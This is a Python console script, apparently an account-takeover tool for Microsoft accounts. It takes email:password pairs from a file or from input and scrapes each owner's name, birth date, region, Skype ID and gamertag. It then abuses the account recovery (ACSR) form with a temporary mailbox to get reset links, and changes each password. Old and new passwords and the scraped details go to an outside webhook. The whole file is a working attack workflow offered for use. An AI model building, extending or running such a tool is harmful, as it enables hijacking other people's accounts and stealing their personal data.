#!/usr/bin/env python3
"""
MS Account Password Changer - Console Edition
Fully console-based for CodeSandbox compatibility
"""

import sys
import os
import json
import time
from getpass import getpass

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from automation.core import scrape_account_info
from automation.acsr import submit_acsr_form
from automation.acsr_continue import continue_acsr_flow
from automation.reset_password import perform_password_reset
from automation.logger import send_webhook
from utils.password_generator import generate_shulker_password

class Colors:
    """ANSI color codes for console output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    """Print application banner"""
    banner = f"""
{Colors.CYAN}{'='*70}
    MS ACCOUNT PASSWORD CHANGER - Console Edition
{'='*70}{Colors.END}
"""
    print(banner)

def print_section(title):
    """Print section header"""
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}{Colors.END}\n")

def print_success(message):
    """Print success message"""
    print(f"{Colors.GREEN}✅ {message}{Colors.END}")

def print_error(message):
    """Print error message"""
    print(f"{Colors.RED}❌ {message}{Colors.END}")

def print_warning(message):
    """Print warning message"""
    print(f"{Colors.YELLOW}⚠️  {message}{Colors.END}")

def print_info(message):
    """Print info message"""
    print(f"{Colors.CYAN}ℹ️  {message}{Colors.END}")

def load_config():
    """Load configuration from config.json"""
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print_warning("config.json not found. Using defaults.")
        return {"webhook_url": ""}
    except json.JSONDecodeError:
        print_error("config.json is invalid. Using defaults.")
        return {"webhook_url": ""}

def load_accounts_from_file(filename="accounts.txt"):
    """Load accounts from a file"""
    accounts = []
    
    if not os.path.exists(filename):
        print_error(f"File not found: {filename}")
        return []
    
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                
                # Skip empty lines and comments
                if not line or line.startswith('#'):
                    continue
                
                # Check for valid format
                if ':' not in line:
                    print_warning(f"Line {line_num}: Invalid format (skipping): {line}")
                    continue
                
                # Split email:password
                parts = line.split(':', 1)
                if len(parts) != 2:
                    print_warning(f"Line {line_num}: Invalid format (skipping): {line}")
                    continue
                
                email, password = parts
                email = email.strip()
                password = password.strip()
                
                if not email or not password:
                    print_warning(f"Line {line_num}: Empty email or password (skipping)")
                    continue
                
                accounts.append({"email": email, "password": password})
        
        return accounts
    
    except Exception as e:
        print_error(f"Error reading file: {e}")
        return []

def get_accounts_from_user():
    """Get accounts from user input"""
    accounts = []
    
    print_section("Add Accounts")
    
    # First, check if accounts.txt exists
    if os.path.exists("accounts.txt"):
        print_info("Found accounts.txt in current directory")
        use_file = input(f"{Colors.BOLD}Load accounts from accounts.txt? (y/n): {Colors.END}").strip().lower()
        
        if use_file == 'y':
            accounts = load_accounts_from_file("accounts.txt")
            if accounts:
                print_success(f"Loaded {len(accounts)} accounts from accounts.txt")
                return accounts
            else:
                print_warning("No valid accounts found in accounts.txt")
    
    # If no accounts.txt or user declined, show menu
    print("\nChoose input method:")
    print("  1. Add accounts manually (one by one)")
    print("  2. Load from custom file")
    print("  3. Quick test (single account)")
    
    choice = input(f"\n{Colors.BOLD}Enter choice (1-3): {Colors.END}").strip()
    
    if choice == "1":
        # Manual entry
        print("\nEnter accounts in format: email:password")
        print("Press Enter with empty line when done.\n")
        
        while True:
            line = input(f"{Colors.CYAN}Account {len(accounts)+1}: {Colors.END}").strip()
            if not line:
                break
            
            if ':' not in line:
                print_error("Invalid format. Use email:password")
                continue
            
            email, password = line.split(':', 1)
            accounts.append({"email": email.strip(), "password": password.strip()})
            print_success(f"Added: {email.strip()}")
    
    elif choice == "2":
        # File upload
        filename = input(f"\n{Colors.BOLD}Enter filename (default: accounts.txt): {Colors.END}").strip()
        if not filename:
            filename = "accounts.txt"
        
        accounts = load_accounts_from_file(filename)
        if accounts:
            print_success(f"Loaded {len(accounts)} accounts from {filename}")
    
    elif choice == "3":
        # Quick test
        print("\nQuick test mode - enter one account:")
        email = input(f"{Colors.CYAN}Email: {Colors.END}").strip()
        password = getpass(f"{Colors.CYAN}Password: {Colors.END}")
        accounts.append({"email": email, "password": password})
    
    else:
        print_error("Invalid choice")
        return []
    
    return accounts

def get_password_mode():
    """Ask user about password generation mode"""
    print_section("Password Mode")
    print("Choose password mode:")
    print("  1. Auto-generate passwords (ShulkerGen######)")
    print("  2. Enter password manually for each account")
    
    choice = input(f"\n{Colors.BOLD}Enter choice (1-2): {Colors.END}").strip()
    return choice == "1"

def display_account_summary(accounts):
    """Display summary of accounts to process"""
    print_section("Account Summary")
    print(f"Total accounts to process: {Colors.BOLD}{len(accounts)}{Colors.END}\n")
    
    for idx, account in enumerate(accounts, 1):
        print(f"  {idx}. {account['email']}")
    
    print()

def solve_captcha_console(captcha_path):
    """Console-based CAPTCHA solving"""
    print_warning(f"CAPTCHA image saved to: {captcha_path}")
    print_info("Open this image in a browser or image viewer to see the CAPTCHA")
    print_info(f"You can use: file://{os.path.abspath(captcha_path)}")
    
    captcha_text = input(f"\n{Colors.BOLD}{Colors.YELLOW}Enter CAPTCHA text: {Colors.END}").strip()
    return captcha_text

def process_single_account(account, idx, total, auto_password, webhook_url):
    """Process a single account"""
    email = account['email']
    old_password = account['password']
    
    print_section(f"Processing Account {idx}/{total}")
    print_info(f"Email: {email}")
    
    try:
        # Step 1: Determine new password
        if auto_password:
            new_password = generate_shulker_password()
            print_info(f"Generated password: {new_password}")
        else:
            new_password = getpass(f"{Colors.CYAN}Enter new password for {email}: {Colors.END}")
            if not new_password:
                print_error("No password provided. Skipping account.")
                return {"success": False, "email": email, "error": "No password provided"}
        
        # Step 2: Scrape account info
        print_info("Scraping account information...")
        account_info = scrape_account_info(email, old_password)
        
        if account_info.get("error"):
            print_error(f"Failed to scrape: {account_info['error']}")
            return {"success": False, "email": email, "error": account_info['error']}
        
        print_success("Account information scraped successfully")
        print(f"  Name: {account_info.get('name', 'N/A')}")
        print(f"  DOB: {account_info.get('dob', 'N/A')}")
        print(f"  Region: {account_info.get('region', 'N/A')}")
        print(f"  Skype ID: {account_info.get('skype_id', 'N/A')}")
        print(f"  Gamertag: {account_info.get('gamertag', 'N/A')}")
        
        # Step 3: Submit ACSR form
        print_info("Submitting ACSR form...")
        captcha_img, driver, token, tempmail = submit_acsr_form(account_info)
        
        if not captcha_img:
            print_error("Failed at ACSR step")
            return {"success": False, "email": email, "error": "ACSR submission failed"}
        
        print_success(f"ACSR form submitted. Temp mail: {tempmail}")
        
        # Step 4: Save and solve CAPTCHA
        captcha_path = f"captcha_{idx}.png"
        with open(captcha_path, "wb") as f:
            f.write(captcha_img.read())
        
        captcha_solution = solve_captcha_console(captcha_path)
        
        # Step 5: Continue ACSR flow
        print_info("Continuing ACSR flow...")
        reset_link = continue_acsr_flow(driver, account_info, token, captcha_solution, f"console_{idx}")
        
        # Handle CAPTCHA retry
        retry_count = 0
        while reset_link == "CAPTCHA_RETRY_NEEDED" and retry_count < 3:
            retry_count += 1
            print_warning(f"Wrong CAPTCHA - retry {retry_count}/3")
            
            retry_captcha_path = f"captcha_retry_console_{idx}.png"
            captcha_solution = solve_captcha_console(retry_captcha_path)
            reset_link = continue_acsr_flow(driver, account_info, token, captcha_solution, f"console_{idx}")
        
        if not reset_link or reset_link in ["CAPTCHA_RETRY_NEEDED", "OTP not received.", "CAPTCHA_DOWNLOAD_FAILED"]:
            print_error(f"Failed to get reset link: {reset_link}")
            return {"success": False, "email": email, "error": str(reset_link)}
        
        print_success("Reset link obtained")
        
        # Step 6: Reset password
        print_info("Resetting password...")
        updated_password = perform_password_reset(reset_link, email, new_password)
        
        print_success(f"Password changed successfully!")
        print_success(f"New password: {updated_password}")
        
        # Prepare result
        result = {
            "success": True,
            "email": email,
            "old_password": old_password,
            "new_password": updated_password,
            "name": account_info.get('name', 'N/A'),
            "dob": account_info.get('dob', 'N/A'),
            "region": account_info.get('region', 'N/A'),
            "skype_id": account_info.get('skype_id', 'N/A'),
            "skype_email": account_info.get('skype_email', 'N/A'),
            "gamertag": account_info.get('gamertag', 'N/A')
        }
        
        # Send to webhook if configured
        if webhook_url:
            print_info("Sending result to webhook...")
            try:
                send_webhook([result], webhook_url)
                print_success("Webhook notification sent")
            except Exception as e:
                print_warning(f"Webhook failed: {e}")
        
        return result
    
    except Exception as e:
        print_error(f"Error processing account: {str(e)}")
        import traceback
        traceback.print_exc()
        return {"success": False, "email": email, "error": str(e)}

def display_results(results):
    """Display final results"""
    print_section("Processing Complete")
    
    successful = [r for r in results if r.get("success")]
    failed = [r for r in results if not r.get("success")]
    
    print(f"{Colors.GREEN}Successful: {len(successful)}{Colors.END}")
    print(f"{Colors.RED}Failed: {len(failed)}{Colors.END}\n")
    
    if successful:
        print(f"{Colors.BOLD}Successful Accounts:{Colors.END}")
        for result in successful:
            print(f"\n  📧 {result['email']}")
            print(f"     Old Password: {result.get('old_password', 'N/A')}")
            print(f"     New Password: {result.get('new_password', 'N/A')}")
            print(f"     Name: {result.get('name', 'N/A')}")
            print(f"     Gamertag: {result.get('gamertag', 'N/A')}")
    
    if failed:
        print(f"\n{Colors.BOLD}Failed Accounts:{Colors.END}")
        for result in failed:
            print(f"\n  📧 {result['email']}")
            print(f"     Error: {result.get('error', 'Unknown error')}")

def main():
    """Main console application"""
    print_banner()
    
    # Load configuration
    config = load_config()
    webhook_url = config.get("webhook_url", "")
    
    if webhook_url:
        print_success(f"Webhook configured: {webhook_url[:50]}...")
    else:
        print_warning("No webhook configured. Results will only be displayed in console.")
    
    # Get accounts
    accounts = get_accounts_from_user()
    
    if not accounts:
        print_error("No accounts to process. Exiting.")
        return
    
    # Get password mode
    auto_password = get_password_mode()
    
    # Display summary
    display_account_summary(accounts)
    
    # Confirm before processing
    confirm = input(f"{Colors.BOLD}Start processing? (y/n): {Colors.END}").strip().lower()
    if confirm != 'y':
        print_info("Processing cancelled.")
        return
    
    # Process accounts
    results = []
    total = len(accounts)
    
    for idx, account in enumerate(accounts, 1):
        result = process_single_account(account, idx, total, auto_password, webhook_url)
        results.append(result)
        
        # Add delay between accounts
        if idx < total:
            print_info("Waiting 5 seconds before next account...\n")
            time.sleep(5)
    
    # Display final results
    display_results(results)
    
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}MS Account Password Changer!{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Process interrupted by user. Exiting...{Colors.END}\n")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)